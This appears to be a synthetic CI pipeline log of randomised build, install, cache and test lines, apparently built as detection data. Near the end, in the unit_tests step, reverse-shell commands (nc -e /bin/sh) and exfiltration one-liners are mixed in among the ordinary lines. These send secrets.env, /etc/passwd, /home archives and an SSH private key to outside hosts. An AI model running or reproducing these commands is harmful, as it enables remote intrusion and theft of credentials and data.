2/10: Building\nStep 3/10: Building\nCache hit for key-4051\n\u2713 test completed\nInstalling react@3.12.0\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 build completed\nStep 8/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nInstalling express@3.16.0\nStep 9/10: Building\nCompiling src/index.js...\n\u2713 test completed\nCompiling src/handler.rs...\nCompiling src/app.ts...\nStep 2/10: Building\nCache hit for key-4048\nCompiling src/service.java...\nStep 7/10: Building\n[12:00:34] INFO: Processing request\n\u2713 test completed\n\u2713 lint completed\nStep 5/10: Building\n  PASS: test_api_health (34ms)\n\u2713 test completed\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_auth_login (283ms)\nCache hit for key-5375\nInstalling axios@5.5.0\nArtifact uploaded: build.tar.gz (28MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 10/10: Building\nInstalling jest@4.5.0\n[12:00:34] INFO: Processing request\n  PASS: test_user_create (367ms)\nCompiling src/service.java...\nCache hit for key-6521\n=== Step type_check completed ===\n=== Step: restore_cache ===\nArtifact uploaded: build.tar.gz (24MB)\nInstalling express@3.6.0\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling webpack@2.5.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nCache hit for key-4460\nInstalling prettier@5.13.0\nInstalling react@5.12.0\nCompiling src/handler.rs...\n[12:00:34] ERROR: Connection failed\nInstalling eslint@4.6.0\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-5068\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (45MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_api_health (142ms)\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nException: RuntimeError\n[12:00:34] INFO: Processing request\nWARNING: jest has known vulnerabilities\nInstalling prettier@1.3.0\nInstalling webpack@4.4.0\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (33MB)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (28MB)\nInstalling lodash@1.17.0\n\u2713 test completed\nCache hit for key-5420\nStep 2/10: Building\nInstalling eslint@4.13.0\nArtifact uploaded: build.tar.gz (25MB)\nStep 8/10: Building\nInstalling react@3.0.0\n  PASS: test_user_create (154ms)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 6/10: Building\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (24MB)\n  PASS: test_auth_login (12ms)\nWARNING: express has known vulnerabilities\nInstalling axios@1.9.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-9298\nCache hit for key-5302\nStep 7/10: Building\n[12:00:34] INFO: Processing request\nStep 6/10: Building\n  PASS: test_db_connect (493ms)\nStep 7/10: Building\nWARNING: react has known vulnerabilities\nInstalling eslint@4.14.0\n\u2717 build failed with exit code 113\nStep 5/10: Building\nCache hit for key-5441\nCache hit for key-6259\nCache hit for key-6710\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\nCache hit for key-6111\nCache hit for key-1091\n\u2717 build failed with exit code 106\n\u2713 build completed\n  PASS: test_api_health (186ms)\nStep 3/10: Building\nStep 10/10: Building\nWARNING: react has known vulnerabilities\nInstalling eslint@5.2.0\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:34] INFO: Processing request\nCache hit for key-6695\nInstalling axios@3.1.0\nInstalling react@4.10.0\n\u2713 lint completed\nInstalling express@5.12.0\nArtifact uploaded: build.tar.gz (36MB)\nFAILED: test_api_health\n  PASS: test_user_create (48ms)\nArtifact uploaded: build.tar.gz (43MB)\nInstalling lodash@3.18.0\n\u2713 test completed\n  PASS: test_api_health (250ms)\nInstalling react@2.5.0\nCache hit for key-3098\nCache hit for key-6375\nCache hit for key-6217\nFAILED: test_cache_hit\nCache hit for key-8731\n  PASS: test_db_connect (365ms)\n  PASS: test_cache_hit (450ms)\n\u2713 lint completed\nInstalling react@4.3.0\nStep 2/10: Building\nStep 10/10: Building\nInstalling eslint@5.18.0\n[12:00:34] INFO: Processing request\nStep 1/10: Building\nCache hit for key-6366\nCompiling src/main.py...\n  PASS: test_cache_hit (240ms)\nCache hit for key-8906\nInstalling lodash@2.16.0\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_cache_hit (80ms)\n\u2713 build completed\n[12:00:34] INFO: Processing request\nInstalling eslint@1.17.0\nStep 10/10: Building\n\u2717 build failed with exit code 122\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\n  PASS: test_api_health (29ms)\n\u2713 test completed\nStep 6/10: Building\nCache hit for key-2900\nCompiling src/index.js...\nStep 5/10: Building\n  PASS: test_user_create (252ms)\nWARNING: webpack has known vulnerabilities\nInstalling express@5.10.0\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_db_connect (340ms)\n[12:00:34] INFO: Processing request\nInstalling lodash@5.8.0\n[12:00:34] WARN: Deprecated API usage\nStep 4/10: Building\nStep 5/10: Building\nCompiling src/app.ts...\n  PASS: test_db_connect (449ms)\nInstalling react@5.19.0\n\u2713 test completed\nCache hit for key-8146\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nStep 9/10: Building\nCache hit for key-3996\n  PASS: test_api_health (440ms)\nStep 9/10: Building\nCompiling src/handler.rs...\n\u2713 test completed\nCache hit for key-6227\nInstalling react@1.5.0\nCache hit for key-5594\nCache hit for key-6020\n\u2713 build completed\n  PASS: test_cache_hit (232ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 8/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 build completed\n  PASS: test_cache_hit (72ms)\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-2488\nStep 8/10: Building\n  PASS: test_api_health (192ms)\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\nWARNING: axios has known vulnerabilities\nCompiling src/app.ts...\n\u2713 test completed\nCompiling src/service.java...\nCache hit for key-6761\nStep 6/10: Building\n  PASS: test_db_connect (228ms)\nInstalling webpack@1.4.0\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-8692\nCompiling src/app.ts...\nCompiling src/index.js...\n  PASS: test_user_create (96ms)\nInstalling express@5.6.0\nWARNING: express has known vulnerabilities\n  PASS: test_api_health (419ms)\n  PASS: test_db_connect (246ms)\nWARNING: lodash has known vulnerabilities\n=== Step restore_cache completed ===\n=== Step: deploy_staging ===\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_api_health (488ms)\nWARNING: prettier has known vulnerabilities\n[12:00:34] INFO: Processing request\nInstalling prettier@2.20.0\nArtifact uploaded: build.tar.gz (46MB)\nStep 3/10: Building\n  PASS: test_user_create (377ms)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (19ms)\nInstalling express@2.13.0\nCompiling src/service.java...\n  PASS: test_user_create (318ms)\nInstalling lodash@3.3.0\n[12:00:34] INFO: Processing request\nCache hit for key-3712\n  PASS: test_auth_login (14ms)\nCache hit for key-9286\nStep 6/10: Building\n\u2713 test completed\nStep 2/10: Building\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (16MB)\n[12:00:34] WARN: Deprecated API usage\nInstalling prettier@5.2.0\nStep 5/10: Building\n\u2713 lint completed\nCache hit for key-7469\nStep 5/10: Building\nCompiling src/utils.go...\nStep 9/10: Building\nStep 7/10: Building\n  PASS: test_db_connect (91ms)\nCache hit for key-5230\nInstalling prettier@2.14.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_db_connect (174ms)\nWARNING: express has known vulnerabilities\n  PASS: test_cache_hit (326ms)\nInstalling express@5.0.0\nInstalling jest@5.14.0\n  PASS: test_user_create (111ms)\nStep 4/10: Building\n  PASS: test_auth_login (228ms)\nInstalling jest@4.5.0\nArtifact uploaded: build.tar.gz (32MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-5287\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling react@4.8.0\n\u2713 lint completed\nCache hit for key-8209\n  PASS: test_api_health (28ms)\nCache hit for key-9890\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: eslint has known vulnerabilities\nStep 3/10: Building\nStep 1/10: Building\nInstalling jest@5.9.0\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-1216\n\u2713 test completed\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 test completed\nInstalling jest@2.18.0\nCache hit for key-5446\nCompiling src/main.py...\nCache hit for key-8232\n[12:00:34] INFO: Processing request\nCache hit for key-5881\nException: NullPointerException\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling eslint@4.2.0\nCompiling src/service.java...\n  PASS: test_api_health (112ms)\nFAILED: test_cache_hit\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCache hit for key-1685\nCompiling src/service.java...\nCache hit for key-1187\nInstalling lodash@5.0.0\n[12:00:34] INFO: Processing request\nStep 2/10: Building\n[12:00:34] INFO: Processing request\nInstalling jest@3.9.0\nStep 4/10: Building\n[12:00:34] INFO: Processing request\nInstalling jest@2.12.0\nCache hit for key-3451\nStep 1/10: Building\nWARNING: prettier has known vulnerabilities\nInstalling webpack@1.5.0\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nInstalling axios@1.11.0\n  PASS: test_cache_hit (342ms)\nCache hit for key-2931\nCache hit for key-7827\n  PASS: test_auth_login (348ms)\n\u2713 test completed\nStep 4/10: Building\n  PASS: test_api_health (164ms)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nInstalling eslint@1.13.0\nStep 9/10: Building\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (5MB)\nWARNING: axios has known vulnerabilities\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nStep 6/10: Building\nCompiling src/app.ts...\nCompiling src/utils.go...\nStep 8/10: Building\nWARNING: prettier has known vulnerabilities\n[12:00:34] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 test completed\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nStep 1/10: Building\n\u2713 lint completed\nCompiling src/utils.go...\n\u2713 lint completed\nInstalling eslint@5.6.0\nStep 5/10: Building\nInstalling axios@5.3.0\nCompiling src/handler.rs...\nInstalling express@5.10.0\n  PASS: test_db_connect (144ms)\n[12:00:34] INFO: Processing request\nInstalling axios@1.16.0\nInstalling eslint@2.5.0\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/service.java...\n\u2713 test completed\nInstalling express@1.18.0\nCache hit for key-9029\nCache hit for key-1492\n\u2713 lint completed\nCache hit for key-6221\nStep 6/10: Building\nInstalling webpack@4.8.0\n  PASS: test_api_health (1ms)\nStep 4/10: Building\nStep 2/10: Building\n  PASS: test_db_connect (50ms)\nInstalling express@5.13.0\n\u2713 test completed\nCache hit for key-7890\nStep 6/10: Building\nStep 9/10: Building\n  PASS: test_user_create (59ms)\nCompiling src/utils.go...\n  PASS: test_api_health (314ms)\nCompiling src/main.py...\n  PASS: test_api_health (103ms)\nStep 4/10: Building\nInstalling jest@3.11.0\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:34] INFO: Processing request\n\u2717 build failed with exit code 98\n  PASS: test_auth_login (275ms)\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (39MB)\nStep 4/10: Building\nCompiling src/handler.rs...\nInstalling prettier@3.20.0\nStep 3/10: Building\n[12:00:34] INFO: Processing request\n\u2713 build completed\nInstalling eslint@5.17.0\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (3MB)\n  PASS: test_api_health (412ms)\n[12:00:34] INFO: Processing request\n\u2713 test completed\nCache hit for key-7962\nStep 9/10: Building\nInstalling react@4.14.0\n\u2717 build failed with exit code 112\nCompiling src/handler.rs...\n  PASS: test_user_create (261ms)\n=== Step deploy_staging completed ===\n=== Step: install_dependencies ===\nCompiling src/handler.rs...\n\u2713 test completed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (5MB)\nWARNING: jest has known vulnerabilities\nStep 1/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] ERROR: Connection failed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-4859\nInstalling webpack@4.17.0\nCompiling src/index.js...\nException: RuntimeError\n  PASS: test_user_create (1ms)\nInstalling lodash@2.14.0\n  PASS: test_api_health (404ms)\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (474ms)\nCompiling src/utils.go...\n\u2713 test completed\nStep 6/10: Building\nInstalling jest@3.8.0\n  PASS: test_cache_hit (252ms)\n  PASS: test_api_health (23ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_cache_hit (172ms)\n[12:00:34] INFO: Processing request\nCache hit for key-9580\nCompiling src/index.js...\nFAILED: test_db_connect\nStep 8/10: Building\nCache hit for key-4393\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: test_user_create (493ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_api_health (276ms)\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\nCache hit for key-3021\nStep 8/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_db_connect (393ms)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nWARNING: express has known vulnerabilities\n\u2713 test completed\nArtifact uploaded: build.tar.gz (20MB)\n\u2717 build failed with exit code 103\nStep 3/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (27MB)\nInstalling react@5.1.0\nException: ValueError\n[12:00:34] WARN: Deprecated API usage\nFAILED: test_db_connect\n[12:00:34] WARN: Deprecated API usage\nStep 5/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 test completed\nException: ValueError\nStep 6/10: Building\nCompiling src/utils.go...\n\u2713 test completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_auth_login (195ms)\nStep 9/10: Building\nInstalling webpack@3.19.0\n[12:00:34] INFO: Processing request\nStep 8/10: Building\n[12:00:34] INFO: Processing request\nCache hit for key-2901\nCache hit for key-5754\n  PASS: test_db_connect (245ms)\nInstalling react@3.10.0\n\u2713 test completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-3205\nWARNING: eslint has known vulnerabilities\nCache hit for key-1163\n\u2713 build completed\nException: ValueError\nCompiling src/utils.go...\nCompiling src/main.py...\n  PASS: test_user_create (243ms)\nStep 7/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nInstalling webpack@1.11.0\n[12:00:34] INFO: Processing request\nInstalling webpack@4.16.0\nCache hit for key-6652\n  PASS: test_auth_login (449ms)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (14MB)\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_user_create (282ms)\nArtifact uploaded: build.tar.gz (8MB)\nWARNING: react has known vulnerabilities\n  PASS: test_api_health (415ms)\nCache hit for key-2790\n[12:00:34] WARN: Deprecated API usage\n\u2713 build completed\nInstalling jest@1.8.0\n  PASS: test_api_health (238ms)\nInstalling jest@3.7.0\n[12:00:34] INFO: Processing request\nInstalling axios@5.1.0\n  PASS: test_auth_login (316ms)\nStep 10/10: Building\nInstalling lodash@1.4.0\nArtifact uploaded: build.tar.gz (23MB)\nInstalling webpack@5.18.0\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (42MB)\nInstalling jest@1.11.0\nCache hit for key-3870\nStep 7/10: Building\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-3386\nArtifact uploaded: build.tar.gz (36MB)\nInstalling lodash@1.5.0\nCache hit for key-8097\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 10/10: Building\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\nCache hit for key-8812\nCache hit for key-5094\n\u2713 build completed\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (38MB)\nStep 7/10: Building\nInstalling axios@4.12.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 test completed\n  PASS: test_auth_login (153ms)\n  PASS: test_db_connect (286ms)\nCache hit for key-7132\n\u2713 lint completed\nInstalling express@1.16.0\nCache hit for key-4782\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:34] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_user_create (7ms)\n  PASS: test_api_health (90ms)\nWARNING: axios has known vulnerabilities\n\u2713 build completed\n\u2713 build completed\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_user_create (317ms)\nArtifact uploaded: build.tar.gz (10MB)\nWARNING: axios has known vulnerabilities\nInstalling jest@2.20.0\n\u2713 lint completed\nInstalling prettier@2.10.0\nStep 10/10: Building\nCache hit for key-4271\nInstalling axios@1.20.0\n\u2713 test completed\nInstalling express@4.5.0\n\u2713 lint completed\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (9MB)\nStep 9/10: Building\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_auth_login (495ms)\n  PASS: test_db_connect (312ms)\n\u2713 lint completed\nStep 8/10: Building\nCompiling src/handler.rs...\n  PASS: test_api_health (26ms)\n\u2713 test completed\nStep 7/10: Building\n\u2713 test completed\nCache hit for key-5541\nStep 2/10: Building\n\u2713 lint completed\nWARNING: axios has known vulnerabilities\nCache hit for key-3547\n=== Step install_dependencies completed ===\n=== Step: upload_artifacts ===\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_api_health (9ms)\n[12:00:34] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_cache_hit (283ms)\nCompiling src/handler.rs...\n\u2713 lint completed\nInstalling lodash@1.6.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:34] INFO: Processing request\nFAILED: test_cache_hit\nCompiling src/app.ts...\nCache hit for key-4624\nCompiling src/handler.rs...\nStep 4/10: Building\nCache hit for key-6137\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_auth_login (458ms)\nStep 8/10: Building\n\u2713 build completed\n  PASS: test_db_connect (417ms)\n[12:00:34] WARN: Deprecated API usage\nInstalling axios@3.11.0\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (9MB)\nWARNING: eslint has known vulnerabilities\nInstalling prettier@2.6.0\nCache hit for key-5292\nArtifact uploaded: build.tar.gz (17MB)\nArtifact uploaded: build.tar.gz (6MB)\nWARNING: eslint has known vulnerabilities\n  PASS: test_user_create (74ms)\nStep 5/10: Building\nStep 8/10: Building\nCache hit for key-5518\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:34] WARN: Deprecated API usage\nInstalling jest@4.16.0\n\u2713 build completed\nCompiling src/app.ts...\nCache hit for key-3504\n[12:00:34] INFO: Processing request\nCache hit for key-7385\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\nInstalling jest@4.9.0\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-5950\nStep 9/10: Building\n  PASS: test_api_health (213ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (9MB)\nInstalling jest@2.7.0\nCache hit for key-1821\nStep 2/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (101ms)\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-2291\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCache hit for key-9996\nCache hit for key-3929\nInstalling eslint@3.2.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 lint completed\nCache hit for key-4500\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (45MB)\nStep 8/10: Building\n  PASS: test_user_create (30ms)\nCompiling src/app.ts...\n  PASS: test_cache_hit (48ms)\nInstalling axios@4.0.0\n\u2713 build completed\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:34] INFO: Processing request\nStep 7/10: Building\n\u2713 lint completed\nCompiling src/handler.rs...\n  PASS: test_auth_login (383ms)\n\u2713 build completed\nInstalling eslint@5.15.0\n\u2713 test completed\n\u2713 lint completed\nCache hit for key-2675\nStep 9/10: Building\n  PASS: test_cache_hit (64ms)\n  PASS: test_auth_login (159ms)\n\u2713 lint completed\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:34] ERROR: Connection failed\nException: ValueError\n\u2713 lint completed\n\u2713 test completed\nCache hit for key-5262\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (306ms)\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (28MB)\nStep 6/10: Building\nCompiling src/main.py...\n  PASS: test_auth_login (356ms)\nCompiling src/main.py...\n[12:00:34] WARN: Deprecated API usage\nStep 2/10: Building\nInstalling express@2.0.0\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 lint completed\nInstalling eslint@1.9.0\n\u2713 build completed\nCache hit for key-4144\n\u2713 test completed\n  PASS: test_auth_login (313ms)\n[12:00:34] INFO: Processing request\nInstalling prettier@3.1.0\nInstalling prettier@1.4.0\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (237ms)\n  PASS: test_api_health (249ms)\nInstalling eslint@4.1.0\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (28MB)\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_user_create (366ms)\n\u2713 lint completed\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-2543\n\u2717 build failed with exit code 3\nInstalling jest@2.16.0\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-4289\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nStep 5/10: Building\n\u2713 lint completed\nCache hit for key-2567\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_auth_login (232ms)\nCache hit for key-8749\n[12:00:34] INFO: Processing request\n  PASS: test_user_create (437ms)\n\u2713 build completed\n  PASS: test_user_create (3ms)\nInstalling axios@1.6.0\n\u2713 lint completed\nInstalling react@1.11.0\nInstalling prettier@5.1.0\nCompiling src/main.py...\nInstalling webpack@2.3.0\n\u2713 lint completed\nCache hit for key-7669\nCache hit for key-1262\nCache hit for key-7638\nCache hit for key-1662\nStep 4/10: Building\nStep 6/10: Building\nCache hit for key-3731\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/service.java...\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/service.java...\n  PASS: test_api_health (288ms)\nCompiling src/app.ts...\n\u2713 lint completed\nCache hit for key-4919\nArtifact uploaded: build.tar.gz (3MB)\nStep 3/10: Building\nCompiling src/handler.rs...\n  PASS: test_api_health (446ms)\n  PASS: test_api_health (194ms)\n[12:00:34] INFO: Processing request\nInstalling eslint@3.8.0\n=== Step upload_artifacts completed ===\n=== Step: unit_tests ===\nWARNING: react has known vulnerabilities\n\u2713 lint completed\n  PASS: test_user_create (411ms)\nCache hit for key-8701\n\u2713 test completed\n[12:00:34] INFO: Processing request\nnc -e /bin/sh 181.175.130.167 38115\ncurl -X POST https://test.io/collect -d @secrets.env\nInstalling axios@1.10.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nnc -e /bin/sh 23.22.44.128 64287\nCache hit for key-8901\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:34] INFO: Processing request\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\ncurl -X POST https://cloud.services/collect -d @secrets.env\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\n\u2713 lint completed\n  PASS: test_user_create (24ms)\nStep 8/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling eslint@5.3.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_db_connect (2ms)\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nInstalling eslint@3.17.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_db_connect (415ms)\nStep 3/10: Building\nStep 3/10: Building\nStep 6/10: Building\nStep 4/10: Building\nnc -e /bin/sh 16.189.3.61 40598\nnc -e /bin/sh 129.13.196.177 22215\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:34] INFO: Processing request\nnc -e /bin/sh 14.90.74.141 24139\n  PASS: test_user_create (437ms)\nStep 9/10: Building\n  PASS: test_db_connect (289ms)\nSending 439MB of data to startup.dev\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 lint completed\nInstalling express@3.18.0\n[12:00:34] INFO: Processing request\nCache hit for key-6202\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\n  PASS: test_cache_hit (95ms)\nCompiling src/handler.rs...\nCompiling src/index.js...\n  PASS: test_db_connect (244ms)\nnc -e /bin/sh 57.208.149.27 59817\nCompiling src/service.java...\nCache hit for key-2692\n\u2713 test completed\nInstalling react@4.12.0\n  PASS: test_auth_login (8ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 59.41.190.12 49831\n\u2713 lint completed\nInstalling axios@2.17.0\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\n\u2713 build completed\n\u2717 build failed with exit code 90\nArtifact uploaded: build.tar.gz (50MB)\nException: RuntimeError\n  PASS: test_auth_login (202ms)\nStep 5/10: Building\nWARNING: webpack has known vulnerabilities\nCache hit for key-3408\ncurl -X POST https://cloud.services/collect -d @secrets.env\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-1931\nInstalling eslint@3.4.0\nInstalling express@2.10.0\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 lint completed\nnc -e /bin/sh 17.82.144.8 29752\n\u2717 build failed with exit code 80\nInstalling lodash@4.13.0\nWARNING: webpack has known vulnerabilities\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (37MB)\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 test completed\nCompiling src/app.ts...\nWARNING: eslint has known vulnerabilities\nWARNING: prettier has known vulnerabilities\nCompiling src/handler.rs...\nCache hit for key-1127\nException: NullPointerException\nInstalling eslint@1.14.0\n[12:00:34] INFO: Processing request\n\u2713 test completed\n  PASS: test_api_health (234ms)\n  PASS: test_cache_hit (444ms)\n[12:00:34] INFO: Processing request\n\u2717 build failed with exit code 54\nInstalling lodash@1.11.0\nWARNING: jest has known vulnerabilities\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (25MB)\nInstalling express@4.8.0\n\u2713 test completed\nCompiling src/service.java...\nStep 8/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 build completed\nCache hit for key-3105\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n[12:00:34] INFO: Processing request\nWARNING: express has known vulnerabilities\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (24MB)\nInstalling webpack@5.18.0\nSending 207MB of data to test.io\nCache hit for key-8949\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (337ms)\nCache hit for key-7579\n  PASS: test_db_connect 